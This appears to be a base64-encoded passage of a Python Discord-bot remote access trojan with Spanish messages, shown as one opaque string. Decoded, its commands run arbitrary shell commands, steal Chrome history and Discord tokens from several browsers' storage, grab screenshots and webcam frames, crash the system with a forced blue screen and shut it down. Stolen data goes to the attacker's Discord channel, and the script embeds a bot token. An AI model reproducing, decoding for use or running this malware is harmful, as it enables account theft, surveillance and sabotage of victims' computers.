paR4paSIOKWkSDilpLilpEgIOKWkiAgIOKWkuKWkiDilpHilpLilpHilpIgICDilpEg4paS4paR4paSICAg4paRICDilpEg4paRICDilpEgIOKWkeKWkiDilpEg4paS4paRCiAgICAgICAgICAgICAgICAgICAgICAgICDilpIg4paR4paRICAgICAg4paRICAgICDilpEgICDilpIgICDilpEg4paRICAg4paRICAgIOKWkSAgIOKWkSDilpEgICDilpEgICDilpHilpEgICDilpEgICDilpEgICDilpIgICAg4paRICAgIOKWkSAg4paRICAgIOKWkSAgICDilpEgICAgIOKWkeKWkSAgIOKWkSAKICAgICAgICAgICAgICAgICAgICAgICAgIOKWkSAgICAgICAgIOKWkSAgICAgICAgIOKWkSAg4paRICAgICAg4paRICAgIOKWkSAg4paRICAgICAg4paRICAgIOKWkSAgICAgICAgICAg4paRICDilpEg4paRICAgICAgIOKWkSAgICAgICAgIOKWkSAg4paRICAg4paRICAgICAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtJbmljaWFyZSBlbiAzIG1pbnV0b3NdCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiIiIikKcHJpbnQoYmFubmVyKQoKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiBzaGVsbChjdHgsICphcmdzKToKICAgIGNvbW1hbmQgPSAnICcuam9pbihhcmdzKQogICAgdHJ5OgogICAgICAgIG91dHB1dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGNvbW1hbmQsIHNoZWxsPVRydWUpLmRlY29kZSgnY3AxMjUyJykKICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgIG91dHB1dCA9IGUub3V0cHV0LmRlY29kZSgnY3AxMjUyJykKICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0iU2hlbGwgT3V0cHV0IiwgZGVzY3JpcHRpb249b3V0cHV0KQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpCgoKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiBoaXN0b3J5KGN0eCk6CiAgICBpbXBvcnQgc3FsaXRlMwogICAgaW1wb3J0IG9zCiAgICBpbXBvcnQgdGltZQogICAgaW1wb3J0IHNodXRpbAogICAgCiAgICB0ZW1wID0gKG9zLmdldGVudignVEVNUCcpKQogICAgVXNlcm5hbWUgPSAob3MuZ2V0ZW52KCdVU0VSTkFNRScpKQogICAgc2h1dGlsLnJtdHJlZSh0ZW1wICsgciJcaGlzdG9yeTEyIiwgaWdub3JlX2Vycm9ycz1UcnVlKQogICAgb3MubWtkaXIodGVtcCArIHIiXGhpc3RvcnkxMiIpCiAgICBwYXRoX29yZyA9IHIiIiIgIkM6XFVzZXJzXHt9XEFwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxIaXN0b3J5IiAiIiIuZm9ybWF0KFVzZXJuYW1lKQogICAgcGF0aF9uZXcgPSB0ZW1wICsgciJcaGlzdG9yeTEyIgogICAgY29weV9tZV90b19oZXJlID0gKCgiY29weSIgKyBwYXRoX29yZyArICJcInt9XCIiICkuZm9ybWF0KHBhdGhfbmV3KSkKICAgIG9zLnN5c3RlbShjb3B5X21lX3RvX2hlcmUpCiAgICAKICAgIGNvbiA9IHNxbGl0ZTMuY29ubmVjdChwYXRoX25ldyArIHIiXGhpc3RvcnkiKQogICAgY3Vyc29yID0gY29uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIHVybCBGUk9NIHVybHMiKQogICAgdXJscyA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICAKICAgIGZvciB4IGluIHVybHM6CiAgICAgICAgZG9uZSA9ICgiIi5qb2luKHgpKQogICAgICAgIGY0ID0gb3Blbih0ZW1wICsgciJcaGlzdG9yeTEyIiArIHIiXGhpc3RvcnkudHh0IiwgJ2EnKQogICAgICAgIGY0LndyaXRlKHN0cihkb25lKSkKICAgICAgICBmNC53cml0ZShzdHIoIlxuIikpCiAgICAgICAgZjQuY2xvc2UoKQogICAgCiAgICBjb24uY2xvc2UoKQogICAgZmlsZSA9IGRpc2NvcmQuRmlsZSh0ZW1wICsgciJcaGlzdG9yeTEyIiArIHIiXGhpc3RvcnkudHh0IiwgZmlsZW5hbWU9Imhpc3RvcnkudHh0IikKICAgIGF3YWl0IGN0eC5zZW5kKCJbKl0gQ29tbWFuZCBzdWNjZXNzZnVsbHkgZXhlY3V0ZWQiLCBmaWxlPWZpbGUpCiAgICAKICAgIGRlZiBkZWxldGVtZSgpIDoKICAgICAgICBwYXRoID0gInJtZGlyICIgKyB0ZW1wICsgciJcaGlzdG9yeTEyIiArICIgL3MgL3EiCiAgICAgICAgb3Muc3lzdGVtKHBhdGgpCiAgICAgICAgCiAgICBkZWxldGVtZSgpCgoKCgoKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiB3YWxscGFwZXIoY3R4KToKICAgIGltcG9ydCBjdHlwZXMKICAgIGltcG9ydCBvcwogICAgcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSArIHIiXHRlbXAuanBnIikKICAgIGF3YWl0IGN0eC5tZXNzYWdlLmF0dGFjaG1lbnRzWzBdLnNhdmUocGF0aCkKICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLlN5c3RlbVBhcmFtZXRlcnNJbmZvVygyMCwgMCwgcGF0aCwgMCkKICAgIGF3YWl0IGN0eC5zZW5kKCJbKl0gQ29tbWFuZCBzdWNjZXNzZnVsbHkgZXhlY3V0ZWQiKQoKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiBtZXNzYWdlKGN0eCwgKmFyZ3MpOgogICAgaW1wb3J0IGN0eXBlcwogICAgaW1wb3J0IHRpbWUKICAgIE1CX1lFU05PID0gMHgwNAogICAgTUJfSEVMUCA9IDB4NDAwMAogICAgSUNPTl9TVE9QID0gMHgxMAogICAgCiAgICBkZWYgbWVzcygpOgogICAgICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKDAsICcgJy5qb2luKGFyZ3MpLCAiRXJyb3IiLCBNQl9IRUxQIHwgTUJfWUVTTk8gfCBJQ09OX1NUT1ApCiAgICAgICAgCiAgICBpbXBvcnQgdGhyZWFkaW5nCiAgICBtZXNzYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PW1lc3MpCiAgICBtZXNzYS5fcnVubmluZyA9IFRydWUKICAgIG1lc3NhLmRhZW1vbiA9IFRydWUKICAgIG1lc3NhLnN0YXJ0KCkKICAgIAogICAgaW1wb3J0IHdpbjMyY29uCiAgICBpbXBvcnQgd2luMzJndWkKICAgIAogICAgZGVmIGdldF9hbGxfaHduZChod25kLG1vdXNlKToKICAgICAgICBkZWYgd2luRW51bUhhbmRsZXIoaHduZCwgY3R4KToKICAgICAgICAgICAgaWYgd2luMzJndWkuR2V0V2luZG93VGV4dChod25kKSA9PSAiRXJyb3IiOgogICAgICAgICAgICAgICAgd2luMzJndWkuU2hvd1dpbmRvdyhod25kLCB3aW4zMmNvbi5TV19SRVNUT1JFKQogICAgICAgICAgICAgICAgd2luMzJndWkuU2V0V2luZG93UG9zKGh3bmQsd2luMzJjb24uSFdORF9OT1RPUE1PU1QsIDAsIDAsIDAsIDAsIHdpbjMyY29uLlNXUF9OT01PVkUgKyB3aW4zMmNvbi5TV1BfTk9TSVpFKQogICAgICAgICAgICAgICAgd2luMzJndWkuU2V0V2luZG93UG9zKGh3bmQsd2luMzJjb24uSFdORF9UT1BNT1NULCAwLCAwLCAwLCAwLCB3aW4zMmNvbi5TV1BfTk9NT1ZFICsgd2luMzJjb24uU1dQX05PU0laRSkgIAogICAgICAgICAgICAgICAgd2luMzJndWkuU2V0V2luZG93UG9zKGh3bmQsd2luMzJjb24uSFdORF9OT1RPUE1PU1QsIDAsIDAsIDAsIDAsIHdpbjMyY29uLlNXUF9TSE9XV0lORE9XICsgd2luMzJjb24uU1dQX05PTU9WRSArIHdpbjMyY29uLlNXUF9OT1NJWkUpCiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIGlmIHdpbjMyZ3VpLklzV2luZG93KGh3bmQpIGFuZCB3aW4zMmd1aS5Jc1dpbmRvd0VuYWJsZWQoaHduZCkgYW5kIHdpbjMyZ3VpLklzV2luZG93VmlzaWJsZShod25kKToKICAgICAgICAgICAgd2luMzJndWkuRW51bVdpbmRvd3Mod2luRW51bUhhbmRsZXIsTm9uZSkKICAgIAogICAgYXdhaXQgY3R4LnNlbmQoIlsqXSBDb21tYW5kIHN1Y2Nlc3NmdWxseSBleGVjdXRlZCIpCiAgICB3aW4zMmd1aS5FbnVtV2luZG93cyhnZXRfYWxsX2h3bmQsIDApCgoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIGJsdWVzY3JlZW4oY3R4KToKICAgICMgTGxhbWEgYSBsYSBmdW5jacOzbiAiS2VybmVsMzIuZGxsIiB5IHJlYWxpemEgdW4gImNyYXNoIgogICAgY3R5cGVzLndpbmRsbC5udGRsbC5SdGxBZGp1c3RQcml2aWxlZ2UoMTksIDEsIDAsIGN0eXBlcy5ieXJlZihjdHlwZXMuY19ib29sKCkpKQogICAgY3R5cGVzLndpbmRsbC5udGRsbC5OdFJhaXNlSGFyZEVycm9yKDB4YzAwMDAwMjIsIDAsIDAsIDAsIDYsIGN0eXBlcy5ieXJlZihjdHlwZXMuY191bG9uZygpKSkKCgpAYm90LmNvbW1hbmQoKQphc3luYyBkZWYgZGVzY2FyZ2FyKGN0eCwgKmFyZ3MpOgogICAgY29tbWFuZCA9ICcgJy5qb2luKGFyZ3MpCiAgICB0cnk6CiAgICAgICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKGNvbW1hbmQsIHNoZWxsPVRydWUpCiAgICAgICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKGNvbW1hbmQsIHNoZWxsPVRydWUpCiAgICAgICAgdXNlciA9IGdldHBhc3MuZ2V0dXNlcigpCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPWYiRGVzY2FyZ2EgRXhpdG9zYSAoe3VzZXJ9KSIsIGNvbG9yPTB4MDBGRjAwLCBkZXNjcmlwdGlvbj0iTGEgZGVzY2FyZ2Egc2UgY29tcGxldMOzIGNvcnJlY3RhbWVudGUgZW4gdHUgUEMuIikKICAgICAgICBlbWJlZC5zZXRfdGh1bWJuYWlsKHVybD0naHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy84MjA0NDAzNDc3MjQ3NDI2ODYvMTA3NDkzNzc2NzE0MzkzNjA3MC9JTUdfMjAyMzAyMDlfMDIzNjE4LmpwZz93aWR0aD00NzMmaGVpZ2h0PTQ3MycpCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToKICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9IkVycm9yIGFsIERlc2NhcmdhciIsIGNvbG9yPTB4RkYwMDAwLCBkZXNjcmlwdGlvbj0iTm8gc2UgcHVkbyBjb21wbGV0YXIgbGEgZGVzY2FyZ2EuIFJldmlzYSBzaSBpbmdyZXNhc3RlIGxvcyBjb21hbmRvcyBjb3JyZWN0YW1lbnRlLiIpCiAgICAgICAgZW1iZWQuc2V0X3RodW1ibmFpbCh1cmw9J2h0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvODIwNDQwMzQ3NzI0NzQyNjg2LzEwNzQ5Mzc3NjcxNDM5MzYwNzAvSU1HXzIwMjMwMjA5XzAyMzYxOC5qcGc/d2lkdGg9NDczJmhlaWdodD00NzMnKQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpCgoKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiBjYW0oY3R4KToKICAgIEltYWdlR3JhYi5ncmFiKGJib3g9KDAsMCw2NDAsNDgwKSkuc2F2ZSgnY2FtZXJhLnBuZycsICdQTkcnKQogICAgYXdhaXQgY3R4LnNlbmQoZmlsZT1kaXNjb3JkLkZpbGUoJ2NhbWVyYS5wbmcnKSkKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiBzdG9wKGN0eCk6CiAgICBvcy5zeXN0ZW0oInNodXRkb3duIC9zIC90IDEiKQoKZGVmIGdldF9hY2NvdW50X25hbWUodG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTEwIFNhZmFyaS81MzcuMzYgRWRnZS8xNi4xNjI5OSIKICAgIH0KICAgIHRyeToKICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuIHIuanNvbigpWyJ1c2VybmFtZSJdICsgIiMiICsgci5qc29uKClbImRpc2NyaW1pbmF0b3IiXQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiAiVW5rbm93biIKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiB0b2tlbnMoY3R4KToKICAgIHBhdGhzID0gWwogICAgICAgIG9zLnBhdGguam9pbihvcy5nZXRlbnYoIkFQUERBVEEiKSwgIi5kaXNjb3JkIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpLAogICAgICAgIG9zLnBhdGguam9pbihvcy5nZXRlbnYoIkFQUERBVEEiKSwgIi5kaXNjb3JkY2FuYXJ5IiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpLAogICAgICAgIG9zLnBhdGguam9pbihvcy5nZXRlbnYoIkFQUERBVEEiKSwgIi5kaXNjb3JkcHRiIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpLAogICAgICAgIG9zLnBhdGguam9pbihvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKSwKICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKSwgIkdvb2dsZSIsICJDaHJvbWUgU3hTIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpLAogICAgICAgIG9zLnBhdGguam9pbihvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpLCAiTWljcm9zb2Z0IiwgIkVkZ2UiLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIiksCiAgICAgICAgb3MucGF0aC5qb2luKG9zLmdldGVudigiTE9DQUxBUFBEQVRBIiksICJCcmF2ZVNvZnR3YXJlIiwgIkJyYXZlLUJyb3dzZXIiLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIiksCiAgICAgICAgb3MucGF0aC5qb2luKG9zLmdldGVudigiQVBQREFUQSIpLCAiT3BlcmEgU29mdHdhcmUiLCAiT3BlcmEgU3RhYmxlIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpLAogICAgICAgIG9zLnBhdGguam9pbihvcy5nZXRlbnYoIkFQUERBVEEiKSwgIk9wZXJhIFNvZnR3YXJlIiwgIk9wZXJhIEdYIFN0YWJsZSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKSwKICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCJBUFBEQVRBIiksICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKSwKICAgIF0KICAgIHRva2VucyA9IFtdCiAgICBmb3IgcGF0aCBpbiBwYXRoczoKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgCiAgICAgICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgaWYgbm90IGZpbGUuZW5kc3dpdGgoIi5sb2ciKSBhbmQgbm90IGZpbGUuZW5kc3dpdGgoIi5sZGIiKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4ob3MucGF0aC5qb2luKHBhdGgsIGZpbGUpLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gW3IiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mzh9IiwgciJtZmFcLltcdy1dezg0fSJdOgogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgYWNjb3VudF9uYW1lID0gZ2V0X2FjY291bnRfbmFtZSh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5zLmFwcGVuZCgoYWNjb3VudF9uYW1lLCB0b2tlbikpCiAgICAKICAgIGlmIG5vdCB0b2tlbnM6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIk5vIHNlIGVuY29udHJhcm9uIHRva2Vucy4iKQogICAgZWxzZToKICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9IlRva2VucyBlbmNvbnRyYWRvczoiLCBjb2xvcj0weGZhZmFmYSkKICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICBhY2NvdW50X25hbWUgPSB0b2tlblswXQogICAgICAgICAgICB0b2tlbiA9IHRva2VuWzFdCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPWFjY291bnRfbmFtZSwgdmFsdWU9ZiJgYGB7dG9rZW59YGBgIiwgaW5saW5lPUZhbHNlKQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQogICAgICAgIAoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIHZvaWNlKGN0eCk6CiAgICB2b2x1bWV1cCgpCiAgICBzcGVhayA9IHdpbmNsLkRpc3BhdGNoKCJTQVBJLlNwVm9pY2UiKQogICAgc3BlYWsuU3BlYWsoY3R4Lm1lc3NhZ2UuY29udGVudFs3Ol0pCiAgICBhd2FpdCBjdHguc2VuZCgiWypdIENvbW1hbmQgc3VjY2Vzc2Z1bHkgZXhlY3V0ZWQiKQoKZGVmIHZvbHVtZXVwKCk6CiAgICBwYXNzCgpAYm90LmV2ZW50CmFzeW5jIGRlZiBvbl9jb21tYW5kX2Vycm9yKGN0eCwgZXJyb3IpOgogICAgaWYgaXNpbnN0YW5jZShlcnJvciwgY29tbWFuZHMuQ29tbWFuZE5vdEZvdW5kKToKICAgICAgICBhd2FpdCBjdHguc2VuZCgnRWwgY29tYW5kbyBxdWUgaW5ncmVzYXN0ZSBubyBleGlzdGUuIEludMOpbnRhbG8gZGUgbnVldm8uJykKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiB3ZWJjYW1waWMoY3R4KToKICAgIHRlbXAgPSBvcy5nZXRlbnYoJ1RFTVAnKQogICAgY2FwID0gY3YyLlZpZGVvQ2FwdHVyZSgwKQogICAgcmV0LCBmcmFtZSA9IGNhcC5yZWFkKCkKICAgIGN2Mi5pbXdyaXRlKHRlbXAgKyByIlx0ZW1wLnBuZyIsIGZyYW1lKQogICAgY2FwLnJlbGVhc2UoKQogICAgCiAgICB3aXRoIG9wZW4odGVtcCArIHIiXHRlbXAucG5nIiwgInJiIikgYXMgaW1hZ2VfZmlsZToKICAgICAgICBpbWcgPSBJbWFnZS5vcGVuKGlvLkJ5dGVzSU8oaW1hZ2VfZmlsZS5yZWFkKCkpKQogICAgCiAgICBpbWdfYnl0ZV9hcnIgPSBpby5CeXRlc0lPKCkKICAgIGltZy5zYXZlKGltZ19ieXRlX2FyciwgZm9ybWF0PSdQTkcnKQogICAgaW1nX2J5dGVfYXJyID0gaW1nX2J5dGVfYXJyLmdldHZhbHVlKCkKICAgIAogICAgZmlsZSA9IGRpc2NvcmQuRmlsZShpby5CeXRlc0lPKGltZ19ieXRlX2FyciksIGZpbGVuYW1lPSJ0ZW1wLnBuZyIpCiAgICBhd2FpdCBjdHguc2VuZCgiWypdIENvbW1hbmQgc3VjY2Vzc2Z1bGx5IGV4ZWN1dGVkIiwgZmlsZT1maWxlKQoKCgpib3QucnVuKCJPVEV6TVRnek5USTROVFEyTmpFeE1qUXkuR1RxdFBoLkc1VVJHbG5JNTRzd3VKODN5S0pTY0Y5Q0RaUHJTdWhXT3ZNOU00Iik=
